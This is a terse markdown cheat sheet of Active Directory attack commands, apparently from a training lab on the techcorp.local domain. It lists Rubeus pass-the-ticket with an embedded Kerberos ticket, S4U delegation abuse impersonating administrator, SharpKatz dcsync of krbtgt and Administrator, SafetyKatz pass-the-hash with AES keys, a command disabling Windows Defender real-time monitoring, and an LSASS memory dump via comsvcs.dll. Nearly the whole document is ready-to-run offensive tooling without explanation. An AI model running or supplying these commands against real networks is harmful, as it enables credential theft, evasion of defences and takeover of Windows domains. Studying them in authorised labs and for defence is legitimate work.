## Rubeus 
Monitoring TGTs
```
C:\Users\Public\Rubeus.exe monitor /targetuser:US-DC$ /interval:5 /nowrap
```
Rubeus Import ticket
```
C:\AD\Tools\Rubeus.exe ptt /ticket:doIFvDCCBbigAwIBBaEDAgEWooIEtDCCBLBhggSsMIIEqKADAgEFoRMbEVVTLlRFQ0hDT1JQLkxPQ0FMoiYwJKADAgECoR0wGxsGa3JidGd0GxFVUy5URUNIQ09SUC5MT0NBTKOCBGIwggReoAMCARKhAwIBAqKCBFAEggRMypUOTMSSaZGdQx9FU5Vptiz5iFxPNzQoe9ktvZx/2c2qS25sphYaI8XjuwYKkCky5fAge4qdd40HOHBCTVLuu3PZ8o/oJYq/XenQd8XwucwngBztdMMDzTPwLTU5eCkpnxjooaJiMjBe9g/RSGo1933Vfc/m8XxH1w4s8eX2dfmhNsI0iKjXC3LZlCMisXJNL+wDcnG6SdjEPeCuhC1Qa80bu9T5XMi096lDnNx9egtCpxsnJPRlaSICag03juAgXFycyrMJxgmz1hHVmiah4lwAaltxWigeOOpiAg9s3iJxq3Oxmt02lHWh4lLgqdZW62cKWkL4sKsD1+39f7LaGw1ub4vI0y1je+OBR2eB7vRsvRQS3k9oC0owDPjW3sNFUbIYwSn+b7FcczW9/Kf5Et3dFmTT4Qre0O/TIKOSB5fEhqD3xGH7QIAuDrsJcjAgS0awEDWkyzq/lg6BuGo1vbTwiJyX6XgsFJiUlShwxlQZVXmqpgVBy1ll/CqTagxLxiCMxmW6vcSXTbtff6HGQzRTl93BdxpGEpRHd3OxdBhQRY7aVIJJhhWcdNbA1fHGEWVseFg5/GVS3jKCvJWr3YyIkC9F97b18Zcu16QK5YG6+tPKrRh+ctnZ+86B2Jh87GkvMCSbqEbqRHHgjCI5aD1+XytZt4gdU0oyb8Ty6iVL0cBKhBW3uj6T5Eei9g+4YOjgnz01Df4eOBsg1Vl8t2XGznLdlAh4N83Z7HUMzBylSLJqB8S5Sx0EIxfWj7OHWjz9HkHzUmwE7k5l5nCAani+aNg/1wC6sCdJAuPmxVT1wBAh/ZPZpntlNYta6mhLkUydwQEltHwVBgB4W1qGZ6UAq+cHfbfjna8WWQt215Zxne/hsBSeQ+1EP6/+9R+6CAjwY+3H7yTtm2rGWOy8O2ayw36L4EABw7Whgc+0y43KNlP0OaD2xat+lrq411hfouILXcmtcpL79B6zifFxOvPVDh2yzcWXG4Yyf8zORNdfOFKy7xtiDaRaSM46kzjh9XsEQKX7AiFb+7pxy/e6vAcj9Wpe2FZNEDeCYnNyfx7QAHyYXJ4mdfPD6+sFvFhDCyDqR+jTqletsoDkBs/nidgQegAPDe1qf2aqYrP4PG7xzsKvVm2Ge2QcR4x2j4H+IkiIcqVuPmCJoeDCTbWp6BU2WjywShkIVegs5npHnXBR+CUOL8bcgfASS1OLS26VIpqacVEt2DpOJE9zGsgS3o8AfR0OA3c4t4GN0YU8NyEcJTbwAbLyQDYdHCnJ2TtiwmIs5WjK4FLrQDFMniHFdnVX3au2h1fbAM+rvkJ5wc+5AOkosEq6be1t7x5nOqidl3viOoVwuYJE4AG3N2/efgdxHepVHdGoAS8qjM/hMNd7Mu20TXeJ/OoF5KG+vWFbr5Dj526LtzQ8YWZgxdOmH7ASn0MKncMDVv8iv0H7QTEV4fFMBJdSiOMBDl2jgfMwgfCgAwIBAKKB6ASB5X2B4jCB36CB3DCB2TCB1qArMCmgAwIBEqEiBCBxXcMwiBNq2guhI47o4NTh22fEJJ8hZ93xtQuFpSImkaETGxFVUy5URUNIQ09SUC5MT0NBTKITMBGgAwIBAaEKMAgbBlVTLURDJKMHAwUAYKEAAKURGA8yMDIzMDQxNDEzMzY0M1qmERgPMjAyMzA0MTQyMzM2NDNapxEYDzIwMjMwNDIxMDQwMzQ1WqgTGxFVUy5URUNIQ09SUC5MT0NBTKkmMCSgAwIBAqEdMBsbBmtyYnRndBsRVVMuVEVDSENPUlAuTE9DQUw=
```
Rubeus triage (ticket list)
```
C:\AD\Tools\Rubeus.exe triage
```
Ruebus sel4u unconstrained delegation
```
C:\AD\Tools\Rubeus.exe s4u /user:appsvc /aes256:b4cb0430da8176ec6eae2002dfa86a8c6742e5a88448f1c2d6afc3781e114335 /impersonateuser:administrator /msdsspn:CIFS/us-mssql.us.techcorp.local /altservice:HTTP /domain:us.techcorp.local /ptt
```
## Sharpkatz
```
C:\AD\Tools\SharpKatz.exe --Command dcsync --User us\krbtgt --Domain us.techcorp.local --DomainController us-dc.us.techcorp.local
C:\AD\Tools\SharpKatz.exe --Command dcsync --User us\Administrator --Domain us.techcorp.local --DomainController us-dc.us.techcorp.local
```
## Safetykatz pth
```
C:\AD\Tools\SafetyKatz.exe "sekurlsa::opassth /user:provisioningsvc /domain:us.techcorp.local /aes256:a573a68973bfe9cbfb8037347397d6ad1aae87673c4f5b4979b57c0b745aee2a  /run:cmd.exe"
```
```
C:\AD\Tools\SafetyKatz.exe "sekurlsa::pth /user:provisioningsvc /domain:us.techcorp.local /aes256:a573a68973bfe9cbfb8037347397d6ad1aae87673c4f5b4979b57c0b745aee2a  /run:cmd.exe"
```

## Windows defender 
Disable Realtime Monitoring
```
Set-MpPreference -DisableRealtimeMonitoring $true
```

## Dump LSASS 
Minidump rundll
```
rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 708 C:\Users\Public\lsass.dmp full
```
